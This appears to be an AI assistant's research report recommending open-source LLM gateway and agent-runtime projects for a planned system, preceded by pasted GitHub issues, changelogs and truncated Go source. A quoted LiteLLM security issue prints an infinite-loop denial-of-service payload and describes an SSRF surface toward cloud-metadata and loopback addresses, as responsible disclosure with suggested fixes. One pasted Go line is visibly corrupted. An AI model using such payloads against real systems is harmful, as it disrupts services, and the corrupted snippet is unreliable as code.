LiteLLM version are you on ?\n\n1.83.7\n\n### Twitter / LinkedIn details\n\n_No response_",

>                 "id": "5075964063",
>                 "user": "IgorGanapolsky",
>                 "body": "Agentic systems are turning into always-on factories: one request fans out into model calls, tool calls, policy checks, and storage.\n\nThe hard part is rarely tokens/sec — it is control-plane reliability:\n1. **Fan-out control** — hard cap on tools/steps per request before external writes\n2. **Durable id + idempotency** — one write per business object (ledger / preflight)\n3. **Observable long jobs** — progress + cooperative cancel on multi-minute runs\n4. **Expected vs actual** — durable artifact id before marking success\n5. **Policy before action** — gate that can refuse known-bad side effects\n\nIf you share one sanitized failing run (expected vs actual + tool result), I can map which pillar is broken. Architecture only.",

>             "number": 28259,
>             "title": "Variant analysis around recent guardrail/prompt advisories: DoS-by-admin via untimed module exec + SSRF design note",
>             "author": "CrunchyJohnHaven",
>             "labels": [
>               "stale"
>             ],
>             "createdAt": "2026-05-19T14:54:25Z",
>             "updatedAt": "2026-08-25T00:05:05Z",
>             "closedAt": "2026-08-25T00:05:05Z",
>             "body": "Variant analysis following GHSA-wxxx-gvqv-xp7p (custom-code sandbox escape, fixed in 1.83.11) and GHSA-xqmj-j6mv-4862 (SSTI in `/prompts/test`, fixed in 1.83.7). Public source code review at HEAD; no proof-of-concept, no testing against any deployed instance.\n\nFiling as a regular issue rather than a security advisory because both findings below are admin-gated (so they're DoS-by-admin, not external attacker reachable) and the third item is a design note rather than a bug. If you'd prefer any of them be tracked privately, let me know and I'll re-route.\n\n---\n\n## Finding 1 — Module-level `exec()` in `POST /guardrails/test_custom_code` runs without timeout protection (Low-Medium, DoS-by-admin)\n\n**File:** `litellm/proxy/guardrails/guardrail_endpoints.py`, around line 2097\n\nThe endpoint correctly requires `PROXY_ADMIN` (line 2084) and correctly applies a 5-second `concurrent.futures.ThreadPoolExecutor` timeout to the `apply_guardrail` *function call* (lines 2149-2158). However, the **module-level `exec()` at line 2097 runs in the FastAPI handler thread with no timeout**:\n\n```python\nEXECUTION_TIMEOUT_SECONDS = 5\n\ntry:\n    exec_globals = build_sandbox_globals()\n\n    try:\n        compiled = compile_sandboxed(request.custom_code)\n        exec(compiled, exec_globals)  # noqa: S102   <-- no timeout protection\n    except SyntaxError as e:\n        ...\n    ...\n\n    # Step 4: Execute the function with timeout protection\n    def execute_guardrail():\n        return apply_fn(test_inputs, safe_request_data, request.input_type)\n\n    try:\n        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:\n            future = executor.submit(execute_guardrail)\n            try:\n                result = future.result(timeout=EXECUTION_TIMEOUT_SECONDS)\n```\n\nRestrictedPython blocks imports, exec, eval, compile, dunder access, and class definitions, so a malicious admin can't escalate to RCE through this path. But RestrictedPython does **not** prevent infinite loops in otherwise-valid Python. A trivial payload like:\n\n```python\nwhile True:\n    pass\n\ndef apply_guardrail(inputs, request_data, input_type):\n    return allow()\n```\n\nwill hang the request handler indefinitely on the `exec()` call. The 5-second timeout never engages because the function call that's wrapped in the timeout (`apply_fn(...)`) is never reached.\n\n**Impact:** admin can DoS a single worker thread per request. With a few concurrent requests an admin can exhaust the proxy's worker pool. Admin-only, so not exploitable by external attackers, but a defense-in-depth gap worth closing.\n\n**Suggested fix:** move the `exec()` call inside the same timeout-protected scope as `apply_fn()`. One sketch:\n\n```python\ndef compile_and_execute_guardrail():\n    compiled = compile_sandboxed(request.custom_code)\n    exec_globals_local = build_sandbox_globals()\n    exec(compiled, exec_globals_local)\n    apply_fn = exec_globals_local.get(\"apply_guardrail\")\n    if not callable(apply_fn):\n        raise RuntimeError(\"Custom code must define an 'apply_guardrail' function\")\n    return apply_fn(test_inputs, safe_request_data, request.input_type), exec_globals_local\n\nwith concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:\n    future = executor.submit(compile_and_execute_guardrail)\n    result, exec_globals = future.result(timeout=EXECUTION_TIMEOUT_SECONDS)\n```\n\nThis puts both the module-level exec and the function call under a single timeout. Error reporting needs a small refactor (you lose the precise compilation-vs-execution distinction unless you catch and re-raise typed exceptions inside the worker), but the overall structure is straightforward.\n\n---\n\n## Finding 2 — Same pattern in persistent custom-code guardrail at startup (Low, defense-in-depth)\n\n**File:** `litellm/proxy/guardrails/guardrail_hooks/custom_code/custom_code_guardrail.py`, around line 146-150\n\n```python\ndef _do_compile(self) -> None:\n    \"\"\"Internal compilation method without lock. Expected to run inside _compile_lock.\"\"\"\n    exec_globals = build_sandbox_globals()\n    compiled = compile_sandboxed(self.custom_code)\n    exec(compiled, exec_globals)  # noqa: S102\n```\n\n`_do_compile()` is called from `_compile_custom_code()` which is called from `__init__()`. When admin-configured custom code is registered as a guardrail, the proxy executes it at instantiation time. Same issue: a module-level infinite loop in admin-configured code hangs proxy startup.\n\nLower severity than Finding 1 because:\n- Affects startup, not arbitrary requests\n- Admin is the only one who can supply the code\n- Easier to diagnose (proxy \"doesn't start\" vs \"hangs intermittently\")\n\nBut the same fix shape applies: bound the compilation/execution in a timeout-protected worker. Even a generous 30-second startup compile timeout would prevent permanent hangs.\n\n---\n\n## Finding 3 — HTTP primitives expose unrestricted outbound URL surface (design note, not a bug)\n\n**File:** `litellm/proxy/guardrails/guardrail_hooks/custom_code/primitives.py`, `http_request` / `http_get` / `http_post`\n\nThe HTTP primitives passed to sandboxed guardrail code allow arbitrary outbound URLs. The validation logic is:\n\n```python\n# Validate URL\nif not is_valid_url(url):\n    return _http_error_response(f\"Invalid URL: {url}\")\n\n# Validate and normalize method\nmethod = method.upper()\nallowed_methods = {\"GET\", \"POST\", \"PUT\", \"DELETE\", \"PATCH\"}\nif method not in allowed_methods:\n    return _http_error_response(...)\n```\n\nThere is no host/domain allowlist, no blocklist for RFC1918 / 169.254.169.254 / localhost. An admin who configures a custom code guardrail that takes user input and forwards any of it through `http_post(...)` creates a request-driven SSRF surface. The proxy's network identity (cluster network access, possible cloud-metadata token access) is what makes the outbound request.\n\nThis isn't a LiteLLM vulnerability per se — admins can already do worse things with custom code — but it's a footgun. A guardrail framework that exposes HTTP without an allowlist makes the \"admin writes a small bug\" → \"user-driven SSRF\" path very short.\n\n**Suggested mitigation:** add an optional allowlist (config-driven) for HTTP destinations from custom guardrail code. Default-deny private/loopback/link-local would be a reasonable starting posture; users who genuinely need to call internal services would opt-in.\n\n---\n\n## Method note + non-findings (for transparency)\n\nApproach: I cloned HEAD (commit `cff3e0b`), grepped for all `exec`/`eval`/`compile` sites in `litellm/proxy/`, all `query_raw`/`execute_raw` callsites, and all `@router.post`/`@router.put` decorators on test/preview/update-shaped endpoints. Then read the relevant files in detail.\n\n**Things I checked and found correctly handled:**\n- The SSTI fix in `/prompts/test` (GHSA-xqmj-j6mv-4862): `PromptManager.jinja_env` uses `ImmutableSandboxedEnvironment` from `jinja2.sandbox`. Other prompt-manager integrations (gitlab, arize, bitbucket) all use the same sandbox class.\n- The MCP test endpoint authorization fix (GHSA-v4p8-mg3p-g94g): both `POST /test/connection` and `POST /test/tools/list` correctly check `LitellmUserRoles.PROXY_ADMIN` early in the handler.\n- The SQL injection in CVE-2026-42208: the auth path is now via `hash_token(api_key)` and Prisma parameterized lookups. The raw SQL in `key_aliases()` (`key_management_endpoints.py`) interpolates only `$N` placeholders into the f-string; user values flow through `*query_params` to `query_raw`. I spot-checked several other `query_raw` callsites in `spend_management_endpoints.py` and `proxy_server.py`; all the ones I looked at used proper parameterization.\n- The RestrictedPython sandbox setup in `guardrail_hooks/custom_code/sandbox.py` is well-constructed (uses `compile_restricted`, `safer_getattr`, `full_write_guard`; the `AsyncAwareTransformer` extension is minimal and delegates to safe parent methods).\n\n**Things I didn't check thoroughly:**\n- The OIDC cache-key collision path (GHSA-jjhc-v7c2-5hh6) — didn't have time to trace the cache key derivation logic comprehensively.\n- The pass-through endpoint registration path (referenced in GHSA-53mr-6c8q-9789) — only verified `/config/update` has the admin gate.\n- The full Jinja sandbox-escape surface — `ImmutableSandboxedEnvironment` is the right base class but specific bypasses have been published in the past; a thorough audit would test against the published bypass corpus.\n\nThese would be reasonable next steps for a follow-up review if you want a more complete sweep.\n\nThank you for the rapid-disclosure cadence on the recent advisories — that's what made variant analysis on this codebase tractable from public data alone.\n",

> **Environment Variables:**
> - `STATE_MEMORY_MCP_DIR`: Absolute path to directory where database files are stored.
> - `STATE_MEMORY_WAL_MODE`: SQLite journal mode (WAL, DELETE, TRUNCATE, PERSIST, MEMORY, OFF).
> - `ALLOW_PRIVATE_WEBHOOKS`: Alias flag for private network webhook dispatch approval.
> - `STATE_MEMORY_ADMIN_KEY`: Secret token required to execute administrative operations like prune_events.
> - `STATE_MEMORY_READ_ONLY`: Forces server into read-only access mode (true/false).
> - `STATE_MEMORY_ADMIN_MODE`: Enables administrative mode globally (true/false).
> - `STATE_MEMORY_AUDIT_ONLY`: Forces server into audit-only access mode (true/false).
> - `STATE_MEMORY_MCP_PROJECT`: Active project slug identifier override.
> - `STATE_MEMORY_WEBHOOK_URL`: Webhook HTTP POST endpoint for real-time state change notifications.
> - `STATE_MEMORY_BUSY_TIMEOUT`: SQLite database lock busy timeout in milliseconds.
> - `STATE_MEMORY_MAX_DB_BYTES`: Maximum database size safety limit in bytes before rejecting writes.
> - `STATE_MEMORY_STRICT_AUDIT`: Enforces strict cryptographic event log verification.
> - `STATE_MEMORY_MCP_LOG_LEVEL`: Logging verbosity on stderr (debug, info, warn, error).
> - `STATE_MEMORY_ENCRYPTION_KEY`: Hex or string key for AES-256-GCM metadata payload encryption at rest.
> - `STATE_MEMORY_WEBHOOK_SECRET`: Secret token sent as Authorization: Bearer <secret> in webhook headers.
> - `STATE_MEMORY_WEBHOOK_TIMEOUT`: Webhook HTTP POST timeout in milliseconds.
> - `STATE_MEMORY_MCP_DEFAULT_BRANCH`: Fallback branch name if Git cannot be queried on startup.
> - `STATE_MEMORY_CYCLE_DETECTION_MODE`: Graph cycle detection policy (strict or best_effort).
> - `STATE_MEMORY_ALLOW_PRIVATE_WEBHOOKS`: Allows dispatching webhooks to local/private network IP addresses.

>                 "value": "- **Stop Sequences Dropped for Nova and Titan** - Bedrock's Converse camelCase `stopSequences` now maps to the neutral `stop` parameter alongside Anthropic's `stop_sequences`. 81 catalog rows were silently losing `stop`, so the provider ran to `end_turn` instead of stopping.\n- **Reasoning Replay Rejected on Chat-Shaped Requests** - `/v1/chat/completions` and `/v1/messages` carry replayed reasoning on `reasoning_details`, but the fail-soft strip only handled Responses-shaped items. A router that switched models mid-conversation returned \"messages.N.content.0: Invalid `signature` in `thinking` block\" to the client instead of retrying without the signature.\n- **Thinking Signatures on Responses Content Blocks** - Signatures are stripped off content blocks, not just `encrypted_content` on the reasoning item. A message could need the strip with `encrypted_content` already absent, and only reasoning items are dropped when nothing survives, so an ordinary message keeps its own content.",

>               {
>                 "value": "<Update label=\"Core\" description=\"1.7.10\">\n- fix: retry after an unverifiable reasoning refusal on chat-shaped requests too - `/v1/chat/completions` and `/v1/messages` carry replayed reasoning on `reasoning_details`, but the fail-soft strip only handled Responses-shaped items, so a router that switched models mid-conversation returned \"messages.N.content.0: Invalid `signature` in `thinking` block\" straight to the client instead of retrying without the signature\n- fix: strip thinking signatures off Responses content blocks, not just `encrypted_content` on the reasoning item - a message could need the strip with `encrypted_content` already absent, and only reasoning items are dropped when nothing survives so an ordinary message keeps its own content",

>       message: |-
>         fix(githubcopilot): distinguish 422 permission-not-granted from repository-access errors with targeted guidance (#6842)
>         ## Summary
>
>         When GitHub returns a 422 for an installation token request, there are two distinct root causes: an inaccessible repository, and a permission that was never granted to the installation. Previously, both cases produced the same error message pointing the operator at the `repository_id`, which is misleading when the actual problem is that the App's `copilot_requests: write` permission was never set or approved.
>
>         ## Changes
>
>         - Added `errPermissionsNotGranted` constant to match GitHub's …
>       messageTruncated: true
>       messageHeadline: 'fix(githubcopilot): distinguish 422 permission-not-granted from repository-access errors with targeted guidance (#6842)'
>       author:
>         name: Suresh Chaudhary
>         email: 83772622+impoiler@users.noreply.github.com
>         login: impoiler
>     - sha: 84da890a4dab8f3eafb9f6d96c90d0ce54cabca2
>       date: 2026-09-29T11:40:08Z
>       message: |-
>         fix(core): allow GitHub Copilot provider keys to have empty values for GitHub App bundle authentication (#6841)
>         ## Summary
>
>         GitHub Copilot keys authenticated via a GitHub App bundle in `github_copilot_key_config` carry no API token in the `value` field. Previously, `CanProviderKeyValueBeEmpty` did not include `GithubCopilot`, causing every App-authenticated key to be rejected at creation time with a misleading "value must not be empty" error rather than passing through to the provider-specific `validateKey` check.
>

>             "content": "// Package schemas defines the core schemas and types used by the Bifrost system.\npackage schemas\n\nimport (\n\t\"database/sql/driver\"\n\t\"encoding/json\"\n\t\"errors\"\n\t\"fmt\"\n\t\"strconv\"\n)\n\nconst (\n\tDefaultInitialPoolSize = 5000\n)\n\ntype KeySelector func(ctx *BifrostContext, keys []Key, providerKey ModelProvider, model string) (Key, error)\n\n// KeyPoolFilter is an optional hook called before key selection to veto keys\n// from the available pool.\ntype KeyPoolFilter func(ctx *BifrostContext, provider ModelProvider, model string, keys []Key) ([]Key, error)\n\n// BifrostConfig represents the configuration for initializing a Bifrost instance.\n// It contains the necessary components for setting up the system including account details,\n// plugins, logging, and initial pool size.\ntype BifrostConfig struct {\n\tAccount            Account\n\tLLMPlugins         []LLMPlugin\n\tMCPPlugins         []MCPPlugin\n\tOAuth2Provider     OAuth2Provider\n\tMCPHeadersProvider MCPHeadersProvider // Backend for MCPAuthTypePerUserHeaders credential storage; nil disables per-user-headers auth (resolver errors at use)\n\tLogger             Logger\n\tTracer             Tracer          // Tracer for distributed tracing (nil = NoOpTracer)\n\tInitialPoolSize    int             // Initial pool size for sync pools in Bifrost. Higher values will reduce memory allocations but will increase memory usage.\n\tDropExcessRequests bool            // If true, in cases where the queue is full, requests will not wait for the queue to be empty and will be dropped instead.\n\tMCPConfig          *MCPConfig      // MCP (Model Context Protocol) configuration for tool integration\n\tKeySelector        KeySelector     // Custom key selector function\n\tKeyPoolFilter      KeyPoolFilter   // Optional hook to filter available keys before selection; nil = all keys eligible\n\tKVStore            KVStore         // shared KV store for clustering/session stickiness; nil = disabled\n\tSessionAffinity    SessionAffinity // Decides which key a session stays on; nil = Bifrost's own default, which needs KVStore to bind anything\n\tModelCatalog       ModelInfoProvider\n}\n\n// ModelProvider represents the different AI model providers supported by Bifrost.\ntype ModelProvider string\n\nconst (\n\tOpenAI        ModelProvider = \"openai\"\n\tAzure         ModelProvider = \"azure\"\n\tAnthropic     ModelProvider = \"anthropic\"\n\tBedrock       ModelProvider = \"bedrock\"\n\tBedrockMantle ModelProvider = \"bedrock_mantle\"\n\tCohere        ModelProvider = \"cohere\"\n\tVertex        ModelProvider = \"vertex\"\n\tMistral       ModelProvider = \"mistral\"\n\tOllama        ModelProvider = \"ollama\"\n\tOpencodeGo    ModelProvider = \"opencode-go\"\n\tOpencodeZen   ModelProvider = \"opencode-zen\"\n\tGroq          ModelProvider = \"groq\"\n\tSGL           ModelProvider = \"sgl\"\n\tParasail      ModelProvider = \"parasail\"\n\tPerplexity    ModelProvider = \"perplexity\"\n\tCerebras      ModelProvider = \"cerebras\"\n\tDeepSeek      ModelProvider = \"deepseek\"\n\tGemini        ModelProvider = \"gemini\"\n\tOpenRouter    ModelProvider = \"openrouter\"\n\tElevenlabs    ModelProvider = \"elevenlabs\"\n\tHuggingFace   ModelProvider = \"huggingface\"\n\tNebius        ModelProvider = \"nebius\"\n\tXAI           ModelProvider = \"xai\"\n\tReplicate     ModelProvider = \"replicate\"\n\tVLLM          ModelProvider = \"vllm\"\n\tRunway        ModelProvider = \"runway\"\n\tRunware       ModelProvider = \"runware\"\n\tFireworks     ModelProvider = \"fireworks\"\n\tSarvam        ModelProvider = \"sarvam\"\n\tWafer         ModelProvider = \"wafer\"\n\tGithubCopilot ModelProvider = \"github-copilot\"\n\tDatabricks    ModelProvider = \"databricks\"\n\tTypesafe      ModelProvider = \"typesafe\"\n)\n\n// SupportedBaseProviders is the list of base providers allowed for custom providers.\nvar SupportedBaseProviders = []ModelProvider{\n\tAnthropic,\n\tBedrock,\n\tCohere,\n\tGemini,\n\tOpenAI,\n\tHuggingFace,\n\tReplicate,\n}\n\n// StandardProviders is the list of all built-in (non-custom) providers.\nvar StandardProviders = []ModelProvider{\n\tAnthropic,\n\tAzure,\n\tBedrock,\n\tBedrockMantle,\n\tCerebras,\n\tCohere,\n\tDeepSeek,\n\tGemini,\n\tGroq,\n\tMistral,\n\tOllama,\n\tOpencodeGo,\n\tOpencodeZen,\n\tOpenAI,\n\tParasail,\n\tPerplexity,\n\tSGL,\n\tVertex,\n\tOpenRouter,\n\tElevenlabs,\n\tHuggingFace,\n\tNebius,\n\tXAI,\n\tReplicate,\n\tVLLM,\n\tRunway,\n\tRunware,\n\tFireworks,\n\tSarvam,\n\tWafer,\n\tGithubCopilot,\n\tDatabricks,\n\tTypesafe,\n}\n\n// RequestType represents the type of request being made to a provider.\ntype RequestType string\n\n// Value implements driver.Valuer so database drivers that append typed\n// column values (e.g. clickhouse-go batch inserts) can serialize the type.\nfunc (r RequestType) Value() (driver.Value, error) {\n\treturn string(r), nil\n}\n\nconst (\n\tListModelsRequest              RequestType = RequestType = \"chat_completion\"\n\tChatCompletionStreamRequest    RequestType = \"chat_completion_stream\"\n\tResponsesRequest               RequestType = \"responses\"\n\tResponsesStreamRequest [120 lines omitted] ...\n\n\n\t\t// Execute auto-executable tools first\n\t\tvar executedToolResults []*schemas.ChatMessage\n\t\tif len(autoExecutableTools) > 0 {\n\t\t\t// Add assistant message with auto-executable tool calls to conversation\n\t\t\tconversationHistory = adapter.addAssistantMessage(conversationHistory, currentResponse)\n\n\t\t\t// Execute all auto-executable tool calls parallelly\n\t\t\twg := sync.WaitGroup{}\n\t\t\twg.Add(len(autoExecutableTools))\n\t\t\tchannelToolResults := make(chan *schemas.ChatMessage, len(autoExecutableTools))\n\n... [67 lines omitted] ...\n\n\t\t\t// Track executed tool results and calls across all iterations\n\t\t\tallExecutedToolResults = append(allExecutedToolResults, executedToolResults...)\n\t\t\tallExecutedToolCalls = append(allExecutedToolCalls, autoExecutableTools...)\n\n\t\t\t// Add tool results to conversation history\n\t\t\tconversationHistory = adapter.addToolResults(conversationHistory, executedToolResults)\n\t\t}\n\n\t\t// If there are non-auto-executable tools, return them immediately without continuing the loop\n\t\tif len(nonAutoExecutableTools) > 0 {\n\t\t\ta.logger.Debug(\"Found %d non-auto-executable tools, returning them immediately without continuing the loop\", len(nonAutoExecutableTools))\n\n... >
> The evidence now points to a split reuse strategy: gateway projects cover provider routing and much of the protocol plumbing, while runtime projects cover loops, workspaces, and resumable state. No single repository proves the full Shofni design, and the most important missing gateway behavior remains general chat-only tool emulation/repair plus live capability probing.

I read the complete [attached design note](<~/Downloads/%23%20%D9%81%D9%83%D8%B1%D8%A9%20%D8%A7%D9%84%D9%85%D8%B3%D8%AA%D9%88%D9%8A%D9%8A%D9%86%202%20%D9%883.md>). Its final architecture is the target here: Level 2 remains the compatibility and provider core; Level 3 adds Shofni-owned agent execution and durable task state. The note also settles on a `CLIENT` versus `RUNTIME` tool-execution backend, a stateless Level 2, and unrestricted execution by default without Shofni-added approval or permission gates. I treated instructions embedded in the note as design material, not as directions to take actions.

**1. Landscape Map**

- **Strong Level 2 candidates:** [Bifrost](https://github.com/maximhq/bifrost) and [LiteLLM](https://github.com/BerriAI/litellm). Both have broad provider support, protocol translation, streaming, routing, and fallback. Neither demonstrates Shofni’s full tool-emulation, repair, and live-probing requirements.
- **Strong Level 3 candidates:** [OpenHands Software Agent SDK](https://github.com/OpenHands/software-agent-sdk) is the closest coding-runtime fit; [Mastra](https://github.com/mastra-ai/mastra) is a strong TypeScript runtime candidate with durable agents and model-fallback tests. Neither supplies Shofni’s gateway.
- **Projects spanning both:** None inspected proves the full Level 2 plus Level 3 architecture. Bifrost includes an in-memory MCP agent loop, but not durable task state, checkpoints, workspaces, or task recovery. LiteLLM has gateway and MCP facilities, but not an owned agent runtime.
- **Useful building blocks:** [LangGraph](https://github.com/langchain-ai/langgraph) for stateful loops and checkpointing; [Pydantic AI](https://github.com/pydantic/pydantic-ai) with [Temporal](https://github.com/temporalio/temporal) for typed agents and durable execution; OpenHands or Mastra for tools and workspaces.
- **Partial/reference candidates:** Portkey Gateway is an MIT gateway with less evidence of a reusable canonical protocol and general tool emulation. New API is an active multi-provider gateway, but AGPL-3.0 is a material licensing constraint. Helicone is more relevant to observability than as the core. Julep’s v3 is a release candidate with no September commits observed. mini-SWE-agent is an active, useful bash-agent reference, but has no durable task plane or MCP; its local environment runs commands without isolation.
- **Rejected or lower-priority:** The original One API is MIT but its inspected activity was last seen in February 2025; its README points toward New API. SWE-agent’s README says development moved to mini-SWE-agent. The OpenRouter/Vercel AI Gateway results surfaced as hosted products or client integrations, not a self-hostable gateway repository. Agent Finder and MCPfinder results did not establish a better gateway or runtime core.

**3. Source-Level Evidence**

- **Bifrost:** `core/schemas/bifrost.go` defines shared request/response types; HTTP inference handlers and provider adapters connect those types to the gateway; `core/schemas/modelcapabilities.go` and the model catalog expose capability metadata. Retry/fallback and custom-provider docs establish routing extensibility. `core/mcp/agent.go` keeps the loop history and depth in memory, runs eligible tools, appends results, and requests the next model response. `core/decisionemulation.go` is decision-operation emulation, not general chat-only tool emulation. In `core/schemas/mux.go`, the function-call stream branch emits tool calls without the assistant role described in [issue #7693](https://github.com/maximhq/bifrost/issues/7693). `core/mcp/utils.go` and the MCP server handler flatten some resource results to text, matching [issue #7666](https://github.com/maximhq/bifrost/issues/7666).
- **LiteLLM:** `litellm/proxy/response_api_endpoints/endpoints.py`, `litellm/proxy/anthropic_endpoints/endpoints.py`, `litellm/router.py`, and `ARCHITECTURE.md` prove its Responses, Anthropic Messages, provider-routing, and fallback surfaces. `model_prices_and_context_window.json` is static capability metadata, not evidence of live route probing. Its root license is MIT but the `enterprise/` tree has separate terms. [Issue #24512](https://github.com/BerriAI/litellm/issues/24512) reports a PyPI credential-stealing compromise in versions 1.82.7 and 1.82.8; this is a release-provenance risk, not evidence that every current release is compromised. [Issue #38612](https://github.com/BerriAI/litellm/issues/38612) reports a Codex Responses-Lite translation problem.
- **OpenHands:** `agent.py` contains `Agent.step`; conversation state, event store, and local conversation implementation show persisted events and create-or-resume flows. Workspace interfaces and MCP client/tool modules demonstrate its execution plane. `automation` owns scheduling and run history, so those platform features should not be confused with SDK features.
- **Mastra:** `durable-agent.ts`, its run registry and recovery methods, workflow snapshots, fallback tests, MCP client, and workspace adapters prove durable-agent and tool capabilities. The durable-agent sources document cross-process limits for closure-only callbacks.
- **LangGraph / Pydantic AI / Temporal:** LangGraph’s prebuilt agent, `ToolNode`, SQLite/Postgres checkpoint packages, and threat model prove an orchestration/checkpoint component, not a gateway or coding workspace. Pydantic AI’s Temporal durability implementation routes model/tool/MCP I/O through activities, while its docs explicitly distinguish run durability from chat-thread storage. Temporal’s README and workflow history prove a general durable execution engine, not an agent runtime.
- **Portkey / New API / Julep:** Portkey’s `src/index.ts`, provider registry, model Responses handler, and stream handler prove a smaller gateway. New API’s `relay/responses_handler.go` and channel handlers prove a multi-provider gateway, but its license is AGPL-3.0. Julep’s `agent_loop.py`, continuation code, and Temporal example prove an interesting bounded, durable-flow design, but its README identifies v3 as a release candidate.

Maintenance signals observed on Sep 29: Bifrost, LiteLLM, OpenHands, Mastra, Pydantic AI, and Temporal had same-day commits; LangGraph had Sep 27 activity and 43 merged PRs during September; OpenHands had 196 merged PRs updated during September; New API had a Sep 28 commit. Portkey’s latest inspected commit was May 25. One month without a Julep commit is a caution, not proof of abandonment. Release dates were not independently established for several candidates.

**4. Reuse / Composition Architectures**

- **Option A — Bifrost as gateway core:** Reuse its Go provider adapters, shared schemas, routing/fallback, streaming, MCP integration, and capability metadata. Add a Shofni protocol boundary, inbound Anthropic Messages only if POC confirms it is missing, live probes, general chat-only tool emulation, parser/repair, and compatibility reports. Apache-2.0 supports a public fork and commercial operation with license notices. Coupling is high if Shofni adopts Bifrost schemas as its permanent contract; lower if those schemas sit behind Shofni’s canonical protocol. Level 3 can add to the same gateway, but streaming and MCP fidelity bugs need early tests.
- **Option B — Gateway plus runtime:** Put Bifrost or LiteLLM behind Shofni’s canonical protocol; add OpenHands SDK for runtime-owned loops, tools, conversations, workspaces, and MCP. Shofni builds the emulation/probing layer, task identity and state bridge, workspace/Git lifecycle details, and evidence schema. This keeps protocol/provider reuse distinct from runtime reuse and gives the clearest Level 2 to Level 3 path. Main costs are cross-language integration and runtime state semantics.
- **Option C — LiteLLM plus Mastra or Pydantic AI/Temporal:** Reuse LiteLLM’s broad API/provider layer and Mastra’s durable agent/fallback features, or pair Pydantic AI with Temporal for durable execution. Shofni still owns its canonical contracts, probes, tool emulation/repair, and task-to-runtime integration. LiteLLM’s incident history raises dependency provenance requirements; Mastra’s enterprise directory has separate terms; Temporal adds operational infrastructure. This is a credible alternative to Option B, not a lower-risk automatic choice.

**5. Remaining Build Gap**

- **Available off the shelf:** Chat Completions and Responses gateway paths; Anthropic Messages through LiteLLM and Portkey; provider routing and fallback; native provider tool calls; stream translation; agent loops; MCP clients; workspace backends; several durable state/checkpoint engines.
- **Available with adapter:** Codex, Claude Code, and OpenCode when their specific client behavior fits a supported API; RelayRouter/A6api/OpenRouter where their actual endpoint behavior matches a generic provider adapter; runtime libraries behind a Shofni model endpoint; Git and workspace adapters.
- **Available with fork/extension:** Shofni canonical protocol boundary; per-model capability registry; client/runtime execution-backend contract; task and session identifiers propagated through gateway and runtime; diagnostics that correlate provider, model, tool calls, workspace, and task.
- **Not found in inspected candidates:** General chat-only tool emulation; reliable text-to-tool parsing plus malformed JSON repair; systematic live probing for native tools, continuation, sequential/parallel tools, and protocol streaming; a complete tool-call conformance suite; exactly-once tool side effects across model fallback.
- **Shofni-specific:** The canonical contract that survives Level 2 → Level 3; the emulation/repair behavior; compatibility report semantics; Level 3 task identity and continuity across provider changes; workspace/worktree ownership; Shofni evidence/audit records; and the adapter that keeps the external gateway replaceable without replacing the Level 2 core.

The largest reusable surface is the provider/protocol gateway and existing runtime frameworks. The largest unique gap is the exact reliability behavior Shofni is intended to provide: emulated tools, repair, capability truth, and task continuation across execution backends.

**6. Level 2 → Level 3 Evolution**

Level 2 should be: clients → Shofni client adapters → Shofni canonical protocol → tool normalization/compatibility and routing → Bifrost or LiteLLM provider layer → provider. In this mode, tool calls return to the client and the client executes them.

Level 3 keeps the client adapters, canonical protocol, provider adapters/router, streaming and error normalization, capability registry, diagnostics, and tool-compatibility layer. Add Agent Core/loop, runtime Tool Executor, task/session/attempt state, durable store, checkpoints/recovery, workspace/Git lifecycle, MCP/browser/API tools, and evidence records. The existing tool contract stays fixed; only its backend changes from `CLIENT` to `RUNTIME`. Level 2 remains stateless; Level 3 adds a durable store rather than replacing the canonical protocol or provider layer.

**7. Licensing / Public GitHub Impact**

Bifrost is Apache-2.0; LiteLLM is MIT outside its separately licensed `enterprise/` tree; Portkey is MIT; OpenHands, LangGraph, Pydantic AI, and Temporal are MIT; Mastra is Apache-2.0 outside `ee/`; Julep is Apache-2.0. These permissive licenses generally allow public redistribution, modification, SaaS use, and proprietary add-on modules subject to their notice and attribution terms. Review any copied subdirectory and bundled third-party code before publishing.

New API is AGPL-3.0: public distribution is possible, but modified network-served versions can trigger source-sharing obligations, making it a poor fit if Shofni may keep integrated modules proprietary. No shortlisted core candidate surfaced under SSPL, BSL, GPL, or LGPL. Helicone is Apache-2.0 but was assessed as observability/reference rather than a core candidate. This is an engineering license screen, not legal advice.

**8. Recommendation**

Do not build a full gateway from scratch, and do not fork before the POC. No existing project is close enough to become the entire Shofni core. Reuse a gateway for protocol/provider breadth, reuse a runtime for execution/state, and keep Shofni’s canonical protocol and tool-compatibility contract as the stable center.

The first POC pair should be **Bifrost + OpenHands SDK**; compare it with **LiteLLM + Mastra**. Bifrost is the cleaner Apache-licensed Go gateway candidate and has useful shared schemas; OpenHands has the strongest inspected coding-runtime fit. LiteLLM/Mastra tests the broadest API path and a TypeScript runtime, but carries a release-provenance concern and a separate Mastra enterprise directory. A third, higher-composition comparison is **Bifrost + Pydantic AI + Temporal**.

Keep Shofni-specific: canonical contracts, generic chat-only emulation and repair, automatic capability probes, compatibility reports, task/workspace continuity, and evidence correlation. The minimum custom layer is that compatibility core plus adapters and integration tests; provider and runtime mechanics can largely be reused.

**9. POC Plan**

Do not implement it yet. Run the same scripted scenarios against the top pairs, with synthetic provider responses and a controlled workspace:

1. Responses client → native-tool provider; Responses client → chat-only provider; Anthropic Messages client → OpenAI-compatible provider.
2. Chat-only provider emits an emulated tool call; parse a textual `tool_call`; repair malformed JSON within a bounded retry count.
3. Execute tool 1 → result → tool 2 → result → final; verify call IDs, arguments, result order, and no duplicates.
4. Stream a tool call through each client protocol; verify valid start/delta/complete events and correct role, tool ID, and final finish reason.
5. Fail the primary provider before a tool call and after a completed tool call; fallback must retain the same task ID, conversation/tool history, workspace identity, and evidence, without re-executing a completed side effect.
6. In Level 3 continuation, restart the runtime from a checkpoint and continue with another model; pass only if the task resumes with matching task/workspace IDs, prior results, and audit sequence.

A candidate passes only if all protocol/tool outputs validate against the relevant client schema, the sequential flow reaches final without dropped or duplicate calls, stream events are complete, the fallback preserves state without repeating completed effects, and resume does not require restarting the task.

**Discovery Tools Actually Used**

- **Octocode:** `ghSearch`, `ghSearchHistory`, `ghGetHistoryItem`, `ghGetFileContent`, and `npmSearch` were used across the research turns. A search batch over the five-query limit was rerun in smaller batches. Empty scoped searches were treated as inconclusive; a Bifrost directory materialization request was unavailable because clone support was disabled. Portkey’s root security-policy path was absent; its `.github/SECURITY.md` was inspected instead. LiteLLM’s `SECURITY.md` path was not found.
